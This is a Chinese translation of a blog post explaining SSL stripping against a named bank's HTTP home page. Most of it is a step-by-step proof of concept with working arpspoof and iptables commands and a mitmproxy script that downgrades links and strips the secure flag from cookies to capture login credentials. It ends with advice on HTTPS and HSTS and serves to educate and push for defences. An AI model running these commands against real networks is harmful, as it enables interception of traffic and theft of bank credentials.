<html>
<head>
<title>The Importance of Using HTTPS All The Way</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">全程使用HTTPS的重要性</h1>
<blockquote>原文：<a href="https://medium.com/google-developer-experts/the-importance-of-using-https-all-the-way-9c65c0224e86?source=collection_archive---------3-----------------------#2016-12-15">https://medium.com/google-developer-experts/the-importance-of-using-https-all-the-way-9c65c0224e86?source=collection_archive---------3-----------------------#2016-12-15</a></blockquote><div><div class="ds gv gw gx gy gz"/><div class="ha hb hc hd he"><div class=""/><div class=""><h2 id="4162" class="pw-subtitle-paragraph ie hg hh bd b if ig ih ii ij ik il im in io ip iq ir is it iu iv dx translated">与银行、安全和中间人攻击的冒险</h2></div><p id="df94" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">几周前，我坐在我女朋友旁边，而她正在浏览互联网。当她去她的银行主页登录她的银行账户时，我注意到少了点什么:网址旁边著名的“锁”图标！我刷新了页面几次，以验证这不是一个错误。</p><figure class="jt ju jv jw fd jx er es paragraph-image"><div role="button" tabindex="0" class="jy jz di ka bf kb"><div class="er es js"><img src="../Images/fff518234da79b3c86eff1ead8521706.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QxEjL5TYADbVGXQEZWcaaA.png"/></div></div><figcaption class="ke kf et er es kg kh bd b be z dx">Typical Woof-in-the-Middle attack</figcaption></figure><h2 id="e29b" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">尽管只有银行的主页通过非安全连接提供服务，而实际的登录页面确实是通过安全连接提供的，但这仍然是一个大问题。</h2><p id="b5cf" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">让我告诉你为什么。</p><h2 id="4fc7" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">从HTTP迁移到HTTPS的问题是</h2><p id="5d19" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">当有人想访问他们银行的网站时，他们会在谷歌上搜索银行名称(如果你想跟进，谷歌“Bank Leumi”)，将书签设置到他们银行的主页，或者他们只需在浏览器中键入URL(在这种情况下，是leumi.co.il)。</p><p id="c7aa" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">不管你如何到达那里，你都会被带到<a class="ae li" href="http://www.leumi.co.il" rel="noopener ugc nofollow" target="_blank">http://www.leumi.co.il</a>——注意开头的HTTP，而不是HTTPS。</p><figure class="jt ju jv jw fd jx er es paragraph-image"><div role="button" tabindex="0" class="jy jz di ka bf kb"><div class="er es lj"><img src="../Images/ca08492359a1179203afbd28b661caa1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zKslcgUr41hhSTKlg7-Mfw.png"/></div></div><figcaption class="ke kf et er es kg kh bd b be z dx">Home page. Cyan button at top leads to the account sign in page</figcaption></figure><p id="b441" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">您可能会想:如果主页是通过不安全的连接提供的，那又会怎么样呢？只要<a class="ae li" href="https://hb2.bankleumi.co.il/uniquesig4e0824291ffbe1b42058d6558ed87217/uniquesig0/InternalSite/CustomUpdate/eBank_ULI_Login.asp?resource_id=C66B095BD60649D18ECB79F04C657517&amp;login_type=2&amp;site_name=leumi&amp;secure=1&amp;URLHASH=16a07e4b-5651-4882-992e-9bb784cbc027&amp;orig_url=https%3a%2f%2fhb2.bankleumi.co.il%2fH%2fLogin.html" rel="noopener ugc nofollow" target="_blank">实际登录</a>页面使用HTTPS，我的数据就受到保护，对吗？</p><p id="390a" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">嗯，技术上来说<em class="lk">是的</em>，除非某个邪恶的人确保它不是。</p><p id="64e0" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">有一种著名的中间人(MITM)攻击，称为SSL剥离，主要是说在某些情况下，攻击者可以通过HTTP而不是HTTPS提供登录页面，从而破坏对您数据的保护。</p><h2 id="8071" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">中间人是如何窃取你的数据的</h2><p id="a19d" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">在本帖中，我将向您展示一个概念证明(PoC ),说明邪恶的黑客可能会如何利用这个漏洞。</p><p id="57ac" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">对于这个概念验证，我们假设攻击者和受影响的用户使用同一个WiFi / LAN网络。简而言之，这就是攻击场景:</p><ol class=""><li id="7879" class="ll lm hh iy b iz ja jc jd jf ln jj lo jn lp jr lq lr ls lt bi translated">攻击者设计了中间人(MITM)攻击。</li><li id="3119" class="ll lm hh iy b iz lu jc lv jf lw jj lx jn ly jr lq lr ls lt bi translated">用户进入银行的主页，得到一个被攻击者修改过的版本，其中所有的HTTPS链接都被替换为相应的HTTP链接。</li><li id="b427" class="ll lm hh iy b iz lu jc lv jf lw jj lx jn ly jr lq lr ls lt bi translated">用户单击登录链接，然后通过HTTP获得登录页面。攻击者充当代理，通过HTTPS将所有请求委派给实际的银行服务器。攻击者使用一些JavaScript修改登录页面，以记录并劫持密码(尽管我应该说在这一步，我们需要击败一个很好的保护机制——但稍后会详细介绍)。</li><li id="313e" class="ll lm hh iy b iz lu jc lv jf lw jj lx jn ly jr lq lr ls lt bi translated">然后，用户输入他们的登录凭证并点击提交。在提交给银行服务器之前，详细信息通过HTTP，通过攻击者的机器发送。</li></ol><h2 id="5d76" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">但是用户呢:他们看到了什么？</h2><p id="8af4" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">除了轻微的延迟，用户不会注意到任何事情。</p><p id="bf44" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">基本上，用户将看到他习惯的相同的登录页面，除了唯一的区别是在登录页面内的页面地址旁边没有“安全锁”图标。(所以一个基本的安全提醒:当输入你的凭证时，<strong class="iy hi">总是</strong>确保“安全锁”在那里。)</p><p id="daf8" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">不幸的是，在这个场景中(从HTTP转移到HTTPS)，即使锁<strong class="iy hi">的存在也不能保证安全性</strong>:攻击者所要做的就是<em class="lk">模仿安全页面。</em>这需要多一点准备。</p><p id="4525" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">因为用于身份验证页面(hb2.bankleumi.co.il)的域与银行主页(leumi.co.il)不同，所以攻击者可以注册一个外观相似的域(如hb2bankleumi.co.il或hb2.bankluemi.co.il ),然后为其获取一个有效的SSL证书，从而在假冒的登录页面上获得一个安全锁标志。</p><p id="bc65" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">如果攻击者采取了这个额外的步骤，用户将看不到<em class="lk">任何不同的</em>，除非他们碰巧注意到SLL证书上的签名不是它应该有的样子。</p><h1 id="7fd4" class="lz kj hh bd kk ma mb mc ko md me mf ks in mg io kv iq mh ir ky it mi iu lb mj bi translated">利用漏洞</h1><p id="6b28" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">利用此漏洞需要一些仅在Linux上可用的工具。幸运的是，我身边总是放着一些覆盆子酱(它们<a class="ae li" rel="noopener" href="/@urish/building-simon-with-angular2-iot-part-2-ee3a270747b5#.fn25gapxa">只是</a>T10】非常有用)。为了使用Raspberry Pi进行这种攻击，您需要使用以太网电缆将Raspberry Pi连接到网络，或者使用外部WiFi加密狗(由于某种原因，Raspberry Pi 3中的内部WiFi芯片无法与其中一种工具配合使用)。</p><p id="ebf1" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">当然，你不需要有一个树莓派。如果你有最新版本的Debian或Ubuntu Linux，操作说明也是类似的(同样，只要确保它和受害者电脑在同一个网络上)。</p><p id="b90d" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated"><strong class="iy hi"> <em class="lk">好玩的事实:</em> </strong> <em class="lk">我也是用一台</em> <a class="ae li" href="https://getchip.com/pages/chip" rel="noopener ugc nofollow" target="_blank"> <em class="lk"> 9美元的单片机</em> </a> <em class="lk">跑了这次攻击。它需要更多的软件修补，但它不需要任何额外的硬件。我发现你花9美元就能买到能做这种事情的东西，这绝对令人惊讶……活着是多么美好/可怕的时光:-) </em></p><p id="33e4" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">为了实施攻击，我们将主要使用两种工具:</p><ol class=""><li id="bfcb" class="ll lm hh iy b iz ja jc jd jf ln jj lo jn lp jr lq lr ls lt bi translated"><code class="du mk ml mm mn b">arpspoof</code> —我们将使用<a class="ae li" href="http://su2.info/doc/arpspoof.php" rel="noopener ugc nofollow" target="_blank">这个工具</a>通过我们的机器转移受害者的PC流量，使用一种叫做<a class="ae li" href="https://en.wikipedia.org/wiki/ARP_spoofing" rel="noopener ugc nofollow" target="_blank"> ARP欺骗</a>的技术</li><li id="d787" class="ll lm hh iy b iz lu jc lv jf lw jj lx jn ly jr lq lr ls lt bi translated"><code class="du mk ml mm mn b">mitmproxy</code> — <a class="ae li" href="https://mitmproxy.org/" rel="noopener ugc nofollow" target="_blank">该工具</a>将监听来自受害者的HTTP请求，并根据我们配置的规则修改它们(这就是SSL剥离为我们做的事情)</li></ol><h2 id="05be" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">步骤0 —安装工具</h2><p id="2c09" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">首先，我们需要安装<code class="du mk ml mm mn b">arpspoof</code>。它是<code class="du mk ml mm mn b">dsniff</code>包的一部分，所以我们只需安装它:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="108b" class="ki kj hh mn b fi ms mt l mu mv">sudo apt-get install dsniff</span></pre><p id="eb0b" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">接下来，我们需要安装<code class="du mk ml mm mn b">mitmproxy</code>，这需要Python 3.5。</p><p id="ea08" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">不幸的是，在撰写本文时，Raspberry Pi还没有针对Python 3.5的预建包，因此您必须遵循这里的<a class="ae li" href="http://raspberrypi.stackexchange.com/a/56632" rel="noopener ugc nofollow" target="_blank">说明</a>并从源代码编译它。整个过程大约需要15-20分钟，取决于您的SD卡速度和网络连接。</p><p id="2d5a" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">要在Raspberry Pi上安装<code class="du mk ml mm mn b">mitmproxy</code>，我们需要设置一个隔离的Python环境并安装一些依赖项。为了设置环境，我们将使用<code class="du mk ml mm mn b"><a class="ae li" href="https://virtualenv.pypa.io/en/stable/" rel="noopener ugc nofollow" target="_blank">virtualenv</a></code>，我们可以通过运行以下命令来安装它:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="7f8a" class="ki kj hh mn b fi ms mt l mu mv">sudo pip3 install virtualenv</span></pre><p id="edb0" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">然后我们安装一些依赖项:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="6acb" class="ki kj hh mn b fi ms mt l mu mv">sudo apt-get install libffi-dev libssl-dev libxml2-dev <br/>sudo apt-get install libxslt1-dev libjpeg62-turbo-dev zlib1g-dev g++</span></pre><p id="11ea" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">现在，我们终于准备好安装<code class="du mk ml mm mn b">mitmproxy</code>:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="eebd" class="ki kj hh mn b fi ms mt l mu mv">cd<br/>virtualenv -p /usr/local/bin/python3.5 proxy<br/>cd proxy<br/>. bin/activate<br/>pip install mitmproxy</span></pre><p id="23de" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">我用的是0.18.2版本的<code class="du mk ml mm mn b">mitmproxy</code>,但是我想新版本也可以。</p><h2 id="180b" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">步骤1-转移受害者的交通</h2><p id="51ed" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">现在我们都设置好了，我们可以进入攻击的第一步，我们将受害者的流量转移到我们的机器上。</p><p id="955f" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">但是，在我们实际转移受害者的流量之前，我们需要确保我们实际上正确处理了转移的流量，并将其转发到网关(路由器)。否则，受害者将无法建立任何网络连接，从而有效地断开他们与互联网的连接。</p><p id="e262" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">为此，我们需要做的就是设置IP转发:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="1e5d" class="ki kj hh mn b fi ms mt l mu mv">sudo sysctl -w net.ipv4.ip_forward=1</span></pre><p id="9bcb" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">现在，让交通改道！</p><p id="e9cb" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">您需要打开两个不同的终端窗口(或者您可以使用<code class="du mk ml mm mn b"><a class="ae li" href="https://www.gnu.org/software/screen/" rel="noopener ugc nofollow" target="_blank">screen</a></code>实用程序)。在第一台终端上运行以下命令:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="8258" class="ki kj hh mn b fi ms mt l mu mv">sudo arpspoof -i eth0 -t <strong class="mn hi">GATEWAY_</strong><strong class="mn hi">IP</strong> <strong class="mn hi">VICTIM_IP</strong></span></pre><p id="6cf0" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">第二个终端上的这个:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="c970" class="ki kj hh mn b fi ms mt l mu mv">sudo arpspoof -i eth0 -t <strong class="mn hi">VICTIM_IP GATEWAY_</strong><strong class="mn hi">IP</strong></span></pre><p id="be72" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">其中<code class="du mk ml mm mn b"><strong class="iy hi">VICTIM_IP</strong></code>是受害者的IP地址，<code class="du mk ml mm mn b"><strong class="iy hi">GATEWAY_IP</strong></code>是网关的IP地址。如果您使用WiFi，您可能还需要将<code class="du mk ml mm mn b">eth0</code>更改为不同的名称，例如<code class="du mk ml mm mn b">wlan0</code>或<code class="du mk ml mm mn b">wlan1</code>。</p><p id="bd5b" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">您可以通过键入<code class="du mk ml mm mn b">ifconfig -a</code>找到网络接口的名称以及网关机器的IP地址。</p><p id="cfba" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">上面的命令基本上用ARP数据包轰炸受害者的机器和网关，告诉它们另一端的目的IP实际上属于攻击者的机器。流量分流就是这样实现的。</p><p id="6931" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">现在随着流量的转移，我们可以开始截取数据。</p><h2 id="0072" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">步骤2-设置SSL剥离(这样您就可以获得受害者的密码)</h2><p id="666e" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">我们现在已经为实际执行攻击做好了一切准备。我们所需要做的就是为<code class="du mk ml mm mn b">mitmproxy</code>提供一个脚本来进行SSL剥离:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="c441" class="ki kj hh mn b fi ms mt l mu mv">def request(flow):<br/>  host = flow.request.headers['Host']<br/>  if host == 'hb2.bankleumi.co.il':<br/>    flow.request.scheme = 'https'<br/>    flow.request.port = 443</span><span id="8f90" class="ki kj hh mn b fi mw mt l mu mv">def response(flow):<br/>  newcontent=flow.response.content.replace(b'<a class="ae li" href="https://%27" rel="noopener ugc nofollow" target="_blank">https://</a>', b'<a class="ae li" href="http://%27%29.replace%28SIGNATURE," rel="noopener ugc nofollow" target="_blank">http://')</a><br/>  flow.response.content = newcontent<br/>  if "set-cookie" in flow.response.headers:<br/>    flow.response.headers.replace(b';secure', b'')</span></pre><p id="836e" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated"><code class="du mk ml mm mn b">response()</code>函数中的前两行拦截所有HTTP响应，并用<code class="du mk ml mm mn b">http</code>替换所有出现的<code class="du mk ml mm mn b">https</code>，有效地确保返回给客户端的页面中的所有链接都没有安全性。</p><p id="2942" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">接下来的两行<code class="du mk ml mm mn b">response()</code>负责从服务器发送的任何cookies中删除<code class="du mk ml mm mn b">secure</code>标志。这个标志意味着浏览器将只通过HTTPS发送回这些cookie，但是由于我们位于中间，我们可以剥离它并确保浏览器仍然将所有会话cookie发送到服务器，甚至通过HTTP。</p><p id="0ef4" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">最后，<code class="du mk ml mm mn b">request()</code>函数拦截对实际登录页面的所有请求(现在通过我们，因为它们是HTTP)，并通过HTTPS将它们代理到实际的银行服务器。这意味着目标服务器不必支持HTTP:<code class="du mk ml mm mn b">request()</code>函数负责在传入的HTTP请求到达目标服务器之前将它们“升级”到HTTPS。</p><p id="a7a3" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">您可以将该脚本保存为<code class="du mk ml mm mn b">sslstrip.py</code>。现在，我们只需用脚本运行<code class="du mk ml mm mn b">mitmproxy</code>:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="ec60" class="ki kj hh mn b fi ms mt l mu mv">cd ~/proxy<br/>. bin/activate<br/>mitmproxy -T --host --anticache --insecure -s sslstrip.py</span></pre><h2 id="426c" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">步骤3 —通过mitmproxy重定向流量并执行攻击</h2><p id="0801" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated"><code class="du mk ml mm mn b">mitmproxy</code>监听TCP端口8080，但是我们想要拦截的HTTP连接是在端口80接收的，所以我们需要设置我们的机器将流量从端口80重定向到端口8080。为此，我们将使用<a class="ae li" href="https://en.wikipedia.org/wiki/Iptables" rel="noopener ugc nofollow" target="_blank"> iptables </a>，一个控制Linux内核防火墙的工具。</p><p id="cfa1" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">在启动并运行<code class="du mk ml mm mn b">mitmproxy</code>之后，您可以运行以下命令来重定向所有HTTP流量，使其通过正确的端口:</p><pre class="jt ju jv jw fd mo mn mp mq aw mr bi"><span id="13ef" class="ki kj hh mn b fi ms mt l mu mv">sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</span></pre><p id="0a47" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">(注:以上是单行代码)</p><p id="769c" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">记得把<code class="du mk ml mm mn b">eth0</code>改成相关的网络接口名。</p><p id="5c77" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">运行上面的命令后，您应该开始在<code class="du mk ml mm mn b">mitmproxy</code>中看到来自受害者的所有HTTP流量:</p><figure class="jt ju jv jw fd jx er es paragraph-image"><div class="er es mx"><img src="../Images/f51165c4a67b50ab0077de0581a282cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*fP9C0mUg_7gv--RYmzoX-Q.png"/></div><figcaption class="ke kf et er es kg kh bd b be z dx">mitmproxy in action — I went to example.com, then to linux.org</figcaption></figure><p id="94a0" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">现在，如果受害者进入银行网站，然后点击进入登录页面的按钮，填写详细信息并登录到他的银行帐户，您将实际上能够拦截通信并获得用户名和密码。</p><figure class="jt ju jv jw fd jx er es paragraph-image"><div role="button" tabindex="0" class="jy jz di ka bf kb"><div class="er es my"><img src="../Images/32cf79282460a13e4226af030ca2c3b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VFa-IdxDevlMu7jAfxpVUw.png"/></div></div><figcaption class="ke kf et er es kg kh bd b be z dx">Look ma, no HTTPS!</figcaption></figure><figure class="jt ju jv jw fd jx er es paragraph-image"><div class="er es mx"><img src="../Images/c1f1a1b7d89b1e48081a6c9b3be3859b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*FHBvpcRAlqUJV8yMpcjxmQ.png"/></div><figcaption class="ke kf et er es kg kh bd b be z dx">The “POST” request is where the sign in form is submitted</figcaption></figure><figure class="jt ju jv jw fd jx er es paragraph-image"><div class="er es mx"><img src="../Images/19f8f90772de8fcc76b4d164d3423dc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*ZIRzlypq29X_JuC_3r0e9g.png"/></div><figcaption class="ke kf et er es kg kh bd b be z dx">You thought I would give you my username and password? They are behind the red squares. The red square on top contains some of the cookie — which can also be considered sensitive information.</figcaption></figure><p id="c5d6" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">在现实世界的场景中，攻击者可能会使脚本更加健壮，而不是在受害者浏览器的每个站点中盲目地将所有出现的<code class="du mk ml mm mn b">https://</code>替换为<code class="du mk ml mm mn b">http://</code>，这可能会干扰一些站点，它会专门针对“有趣”的页面，甚至可能只是该页面上的相关链接。</p><h1 id="f691" class="lz kj hh bd kk ma mb mc ko md me mf ks in mg io kv iq mh ir ky it mi iu lb mj bi translated">现在怎么办？保护您的信息和网站</h1><p id="3c6a" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">既然您已经看到了该漏洞是如何被利用的，作为用户，您可以遵循以下一些规则来保护自己:</p><ol class=""><li id="67dc" class="ll lm hh iy b iz ja jc jd jf ln jj lo jn lp jr lq lr ls lt bi translated">使用公共/未知网络时，避免登录敏感网站。这包括机场、酒店/旅馆/机场、公共咖啡厅、任何不受密码保护的WiFi网络等。甚至你工作中的网络也可能不安全！</li><li id="859d" class="ll lm hh iy b iz lu jc lv jf lw jj lx jn ly jr lq lr ls lt bi translated">当你登录你的银行账户或其他敏感网站时，在你输入密码之前，停下来一会儿——仔细检查你是否看到锁标志，以及域名是否有意义。请记住，攻击者可以购买一个具有SSL证书的相似外观的域，并使用它进行攻击——安全通信并不自动意味着您使用正确的域名进行对话。<br/> <em class="lk">注:下个月开始，Chrome其实会</em> <a class="ae li" href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="noopener ugc nofollow" target="_blank"> <em class="lk">辅助那个</em> </a> <em class="lk">！</em></li></ol><p id="e733" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">作为网站所有者，保护用户免受这些攻击的最好办法是确保你的所有页面都使用SSL，包括营销页面。</p><p id="f249" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">很多用户会通过搜索引擎或你在社交网络上分享的链接来访问你的网站。通过将HTTPS用于营销页面，您可以确保他们始终使用安全的连接，从而避免出现可被上述SSL剥离攻击利用的弱点。</p><p id="f034" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">您还应该启用<a class="ae li" href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security" rel="noopener ugc nofollow" target="_blank"> HTTP严格传输安全(HTST) </a>，它告诉浏览器总是使用HTTPS进行连接，即使引用链接使用HTTP(例如，如果用户键入【http://leumi.co.il】<a class="ae li" href="http://leumi.co.il," rel="noopener ugc nofollow" target="_blank">，</a>，浏览器会自动将链接更改为<a class="ae li" href="https://leumi.co.il," rel="noopener ugc nofollow" target="_blank"> <strong class="iy hi"> https </strong> ://leumi.co.il，</a>，甚至在发出初始请求之前)。</p><p id="eded" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">遵循上述步骤将使所描述的攻击变得无用，因为所有的通信都将安全地完成，并且没有SSL剥离攻击的挂钩点。</p><h2 id="3c3d" class="ki kj hh bd kk kl km kn ko kp kq kr ks jf kt ku kv jj kw kx ky jn kz la lb lc bi translated">加密密码:令人惊讶的第二道防线</h2><p id="529c" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">我第一次运行PoC攻击时，它非常有效，但是在第二次尝试时(经过一些修补)，它实际上不起作用:密码以某种方式进行了编码。这让我很好奇。</p><p id="28d4" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">我做了一些调查，发现密码实际上是在你输入的时候加密的。如果您使用Chrome开发工具将字段的类型从<code class="du mk ml mm mn b">password</code>更改为<code class="du mk ml mm mn b">text</code>并键入一些字符，您就可以看到它:</p><figure class="jt ju jv jw fd jx er es paragraph-image"><div class="er es mz"><img src="../Images/702ba19af8118f14fe511558be154baa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1098/1*VydCTpLre-yLBG-NZFm7nw.gif"/></div><figcaption class="ke kf et er es kg kh bd b be z dx">I only type “a”, but get different characters</figcaption></figure><p id="2f10" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">我可以通过在登录页面中注入5行JavaScript代码来绕过这一防御(这确实需要大约一个小时的研究和Chrome Dev工具的大量帮助)，但是为了保护银行用户的隐私，我将具体细节留在本文范围之外。</p><p id="579b" class="pw-post-body-paragraph iw ix hh iy b iz ja ii jb jc jd il je jf jg jh ji jj jk jl jm jn jo jp jq jr ha bi translated">这实际上是一种抵御某种攻击的聪明方法，但不幸的是，它无法抵御这里描述的有针对性的MITM攻击。因此，在投入大量精力实现专有安全机制之前，我强烈建议网站所有者首先利用我上面描述的广泛可用的安全策略。</p><h1 id="86b7" class="lz kj hh bd kk ma mb mc ko md me mf ks in mg io kv iq mh ir ky it mi iu lb mj bi translated">行动号召和最后的话</h1><p id="3259" class="pw-post-body-paragraph iw ix hh iy b iz ld ii jb jc le il je jf lf jh ji jj lg jl jm jn lh jp jq jr ha bi translated">我希望这篇文章能让用户更加谨慎，并仔细检查安全锁以及他们将自己宝贵的凭据交给了什么网站。</p><p id="0b0c" 